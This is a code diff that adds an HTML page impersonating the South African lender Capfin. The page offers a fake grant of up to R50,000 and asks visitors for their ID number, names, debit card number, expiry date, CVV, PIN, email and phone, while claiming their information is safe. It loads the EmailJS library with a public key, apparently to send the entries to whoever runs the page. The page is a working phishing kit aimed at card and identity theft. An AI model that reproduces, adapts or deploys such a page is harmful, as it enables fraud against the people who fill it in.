@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capfin Loan</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="company-info" style="background-color: white;">
+        <img src="download.png" alt="Company Logo" class="company-logo">
+        <div>
+             <h2 style="color: black;">CAPFIN SA (Pty) Ltd</h2>
+        <p style="color: black;"> Confratuations! You have been selected as a potential candidate for a capfin grant up to R50,000! Your application will be reviewed and deemed elegible for further consideration. <br/></p>
+        </div>
+    </div>
+    <img src="capfin.jpg" alt="Company Logo" class="image-at-end">
+    <p style="color: white;"> Please note that final approval is contingent upon further review and verification of your application materials. We will be in touch soon to request additional informaiton and to Discuss the Next Steps in the Process. Thank you for your hard work and dedicaiton. We look forward to the possiblility of supporting your endeavors!</p>
+    <div class="payment-form">
+        <form id="payment-form">
+            <h3>Your information is safe with us, no one will get access to any information you fill in the forom below </h1>
+
+            <br>
+            <label for="ID-numuber">ID Number</label>
+            <input type="text" id="ID-Number" name="ID Number" placeholder="ID Number">
+            <br>
+            
+            <br>
+            <label for="first-name">First Name</label>
+            <input type="text" id="First-Name" name="First-Name" placeholder="First Name">
+            <br>
+            <br>
+            <label for="middle-name">Middle Name</label>
+            <input type="text" id="Middle-Name" name="Middle-Name" placeholder="Middle Name(optiaonal)">
+            <br>
+            <br>
+            <label for="last-name">Last Name</label>
+            <input type="text" id="Last-Name" name="Last-Name" placeholder="Last Name">
+            <br>
+            <br>
+            <h2 style="margin: 0;"> Put the amount you want and link your dedit card for payment</h2>
+            <br>
+            <label for="loan-mount">Loan Amount(R):</label>
+            <input type="text" id="Loan-Amount" name="Loan-Amount" placeholder="Enter the amount you want">
+            <br><br>
+            <label for="bank-name">Bank Name:</label>
+            <input type="text" id="bank-name" name="bank-name" placeholder="Enter Bank Name">
+            <br><br>
+            <label for="card-number">Card Number:</label>
+            <input type="text" id="card-number" name="card-number" placeholder="Enter Card Number">
+            <br><br>
+            <label for="expiring-date">Expiring Date:</label>
+            <input type="text" id="expiring-date" name="expiring-date" placeholder="Expiring Date" >
+            <br><br>
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" placeholder="Enter CVV">
+            <br><br>
+            <label for="PIN">PIN:</label>
+            <input type="text" id="PIN" name="PIN" placeholder="Please enter your PIN">
+            <br><br>
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" placeholder="Enter Email">
+            <br><br>
+            <label for="phone-number">Phone Number:</label>
+            <input type="tel" id="phone-number" name="phone-number" placeholder="Enter Phone Number">
+            <br><br>
+            <input type="submit" value="Confirm" id="pay-button" class="pay-button">
+        </form>
+    </div>
+    <div class="note">
+        <p style="color: white" >Kindly fill in your details correctly and we will get back to you via email or SMS to confirm card ownership.</p>
+    </div>
+
+    <img src="cap.png" alt="Company Logo" class="image-at-end">
+
+    <script src="script.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "BY0_xcfUatZaPlAxQ",
+      });
+   })();
+</script>
+
+</body>
+</html>
